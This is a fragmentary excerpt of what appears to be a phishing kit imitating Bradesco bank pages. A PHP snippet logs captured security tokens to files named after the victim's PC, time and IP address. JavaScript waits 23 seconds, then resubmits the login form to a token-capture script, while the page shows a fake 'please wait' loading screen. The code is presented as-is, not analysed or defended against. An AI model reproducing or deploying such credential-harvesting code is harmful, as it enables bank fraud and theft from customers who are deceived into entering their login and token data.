...
$h = date(" d-m-Y H-i-s");
$fp = fopen("$n_dir"."Bradesco_Token_"."$pcname"."-"."["."$h]"."$ip".".txt", "a");
...
function MM_callJS(jsStr) { //v2.0
  return eval(jsStr)
        ...
        <script type="text/javascript">
function chavedescoaguard() {

  var t=setTimeout("picona()",23000);
}


function picona() {
  document.forms['FLogin'].action = "chavetk.php";
...
<div id="conteudo" style="left:0; "  class="after conteudo_L">
  <table width="100%" border="0" cellpadding="0" cellspacing="0">
    <tr>
    <td width="16%" align="center" valign="top" style=" vertical-align:top; padding-top:38px; padding-left:5px;"><p><font size="2">AGUARDE...</font></p>
      <p><img src="carregando.gif" alt="" width="310" height="320" /></p></td>
    </tr>
</table>
<p>&nbsp;</p>
<p>
